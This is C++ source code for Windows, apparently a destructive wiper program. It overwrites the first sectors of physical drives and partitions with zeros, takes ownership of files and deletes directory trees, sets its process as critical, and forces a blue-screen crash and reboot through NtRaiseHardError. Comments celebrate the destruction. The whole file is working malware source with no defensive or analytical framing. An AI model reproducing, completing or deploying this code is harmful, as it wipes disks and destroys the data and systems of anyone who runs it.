#include "NoWayHome.h"
BOOLEAN bl;
#pragma comment(lib,"ntdll.lib")
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
ULONG BreakOnTermination;
NTSTATUS status;
LPCWSTR overwrite[] = {
    L"\\\\.\\PhysicalDrive0",
    L"\\\\.\\PhysicalDrive1",
    L"\\\\.\\PhysicalDrive2",
    L"\\\\.\\C:",
    L"\\\\.\\D:",
    L"\\\\.\\E:",
    L"\\\\.\\Harddisk0Partition1",
    L"\\\\.\\Harddisk0Partition2",
    L"\\\\.\\Harddisk0Partition3",
    L"\\\\.\\Harddisk0Partition4",
    L"\\\\.\\Harddisk0Partition5",
    L"\\\\.\\Harddisk1Partition1",
    L"\\\\.\\Harddisk1Partition2",
    L"\\\\.\\Harddisk1Partition3",
    L"\\\\.\\Harddisk1Partition4",
    L"\\\\.\\Harddisk1Partition5",
    L"\\\\.\\Harddisk2Partition1",
    L"\\\\.\\Harddisk2Partition2",
    L"\\\\.\\Harddisk2Partition3",
    L"\\\\.\\Harddisk2Partition4",
    L"\\\\.\\Harddisk2Partition5"
};
long long FileNum = 0;
const size_t nOverwrite = sizeof(overwrite) / sizeof(void*);



void OverWrite(LPCWSTR Name) {
    HANDLE hFile = CreateFile(Name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    unsigned char* EmptyData = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 512);
    DWORD dwUnused;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    for (int i = 0; i < 50000; i++) {
        WriteFile(hFile, EmptyData, 512, &dwUnused, NULL);
    }
    CloseHandle(hFile);
}

void OverWriteDisk() {
    for (int i = 0; i < nOverwrite; i++) {
        CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(OverWrite), (PVOID)overwrite[i], 0, NULL);
        Sleep(10);
    }
}

bool SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, bool bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege) {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else {
        tp.Privileges[0].Attributes = 0;
    }

    if (!AdjustTokenPrivileges(hToken, false, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        return false;
    }

    return true;
}
bool TakeOwnership(LPCTSTR lpszOwnFile)
{
    HANDLE hToken = NULL;
    PSID pSIDAdmin = NULL, pSIDEveryone = NULL;
    PACL pACL = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
    const int NUM_ACES = 2;
    EXPLICIT_ACCESS ea[NUM_ACES];
    DWORD dwRes;

    if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone))
    {
        return false;
    }

    if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin))
    {
        return false;
    }

    ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));

    ea[0].grfAccessPermissions = GENERIC_READ;
    ea[0].grfAccessMode = SET_ACCESS;
    ea[0].grfInheritance = NO_INHERITANCE;
    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea[0].Trustee.ptstrName = (LPTSTR)pSIDEveryone;

    ea[1].grfAccessPermissions = GENERIC_ALL;
    ea[1].grfAccessMode = SET_ACCESS;
    ea[1].grfInheritance = NO_INHERITANCE;
    ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    ea[1].Trustee.ptstrName = (LPTSTR)pSIDAdmin;

    if (ERROR_SUCCESS != SetEntriesInAcl(NUM_ACES, ea, NULL, &pACL))
    {
        return false;
    }

    dwRes = SetNamedSecurityInfo((LPWSTR)lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

    if (ERROR_SUCCESS == dwRes)
    {
        return true;
    }

    if (dwRes != ERROR_ACCESS_DENIED)
    {
        return false;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        return false;
    }

    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, true))
    {
        CloseHandle(hToken);
        return false;
    }

    dwRes = SetNamedSecurityInfo((LPWSTR)lpszOwnFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL);

    if (dwRes != ERROR_SUCCESS)
    {
        SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, false);
        CloseHandle(hToken);
        return false;
    }

    dwRes = SetNamedSecurityInfo((LPWSTR)lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

    if (dwRes != ERROR_SUCCESS)
    {
        SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, false);
        CloseHandle(hToken);
        return false;
    }

    SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, false);
    CloseHandle(hToken);
    return true;
}
void DestroyDirectory(LPWSTR Directory) {
    // Take ownership of the directory and its contents
    TakeOwnership(Directory);

    // Append a backslash if necessary
    if (Directory[wcslen(Directory) - 1] != '\\' && wcslen(Directory) < 260) {
        lstrcat(Directory, L"\\");
    }

    // Construct the search path
    WCHAR SearchDir[MAX_PATH] = { 0 };
    lstrcpy(SearchDir, Directory);
    lstrcat(SearchDir, L"*.*");

    // Find the first file in the directory
    WIN32_FIND_DATA findData;
    HANDLE hSearch = FindFirstFile(SearchDir, &findData);

    // If no files were found, return
    if (hSearch == INVALID_HANDLE_VALUE) {
        return;
    }

    // Iterate over each file in the directory
    else do {
        // Ignore the "." and ".." directories and symbolic links
        if (!lstrcmp(findData.cFileName, L".") || !lstrcmp(findData.cFileName, L"..") || findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
            continue;
        }

        // Construct the full path to the file
        WCHAR Path[MAX_PATH] = { 0 };
        lstrcpy(Path, Directory);
        lstrcat(Path, findData.cFileName);

        // Increment the file count
        if (FileNum < LLONG_MAX) {
            FileNum++;
        }

        // If the file is a directory, recursively delete its contents and the directory itself
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            lstrcat(Path, L"\\");
            DestroyDirectory(Path);
            RemoveDirectory(Path);
        }
        // If the file is a regular file, take ownership and delete it
        else if (TakeOwnership(Path) && !(FileNum % 15)) {
            DeleteFile(Path);
        }
    } while (FindNextFile(hSearch, &findData));

    // Close the search handle
    FindClose(hSearch);
}

void CrashWindows() {
    //crashing windows is just so easy!
    HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
    if (hNtdll) {
        VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
        VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");

        if (RtlAdjustPrivilege && NtRaiseHardError) {
            unsigned char unused1;
            long unsigned int unused2;
            RtlAdjustPrivilege(0x13, true, false, &unused1);
            NtRaiseHardError(0xdeaddead, 0, 0, 0, 6, &unused2); //and this will be more epic! :)
        }

        FreeLibrary(hNtdll);
    }

    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}


// Function to set the current process as critical
void SetCriticalProcess() {

    RtlAdjustPrivilege(20, TRUE, FALSE, &bl);
    BreakOnTermination = 1;

    status = NtSetInformationProcess((HANDLE)-1, 0x1d, &BreakOnTermination, sizeof(ULONG));
}

// Function to crash the system with a custom error code
void CrashWindowswithbeef() {
    // Load the ntdll.dll library and get the addresses of the RtlAdjustPrivilege and NtRaiseHardError functions
    HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
    VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");

    // Enable the shutdown privilege
    unsigned char unused1;
    long unsigned int unused2;
    RtlAdjustPrivilege(19, true, false, &unused1);

    // Raise the hard error with the custom code and a message box
    MessageBox(NULL, L"Operation! Completed Now The Computer will reboot by force!!", L"Critical Error", MB_OK | MB_ICONERROR);
    NtRaiseHardError(MY_ERROR_CODE, 0, 0, 0, 6, &unused2);

    // Free the ntdll.dll library
    FreeLibrary(hNtdll);
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}
